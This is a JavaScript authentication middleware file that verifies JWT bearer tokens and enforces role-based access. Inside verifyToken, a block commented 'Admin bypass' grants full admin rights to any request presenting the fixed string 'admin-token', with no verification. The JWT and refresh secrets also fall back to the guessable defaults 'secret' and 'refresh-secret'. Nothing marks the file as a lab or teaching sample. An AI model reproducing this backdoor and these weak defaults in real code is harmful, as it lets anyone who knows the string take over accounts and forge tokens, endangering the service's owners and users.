import dotenv from "dotenv";
import jwt from "jsonwebtoken";
dotenv.config();

const JWT_SECRET = process.env.JWT_SECRET || "secret";
const REFRESH_SECRET = process.env.REFRESH_SECRET || "refresh-secret";

export const extractTokenFromHeader = (req) => {
  const auth = req.headers.authorization || "";
  const parts = auth.split(" ");
  return parts.length === 2 ? parts[1] : null;
};

export const verifyToken = (req, res, next) => {
  const token = extractTokenFromHeader(req) || req.cookies?.token;

  // Admin bypass
  if (token === "admin-token") {
    req.user = { id: 0, email: "admin@example.com", role: "admin" };
    return next();
  }

  if (!token) return res.status(401).json({ message: "Token required" });

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = { id: decoded.userId, email: decoded.email, role: decoded.role };
    next();
  } catch {
    return res.status(401).json({ message: "Invalid token" });
  }
};

export const roleGuard =
  (allowedRoles = []) =>
  (req, res, next) => {
    if (!req.user) return res.status(401).json({ message: "Unauthenticated" });
    if (allowedRoles.length === 0 || allowedRoles.includes(req.user.role))
      return next();
    return res.status(403).json({ message: "Access denied" });
  };
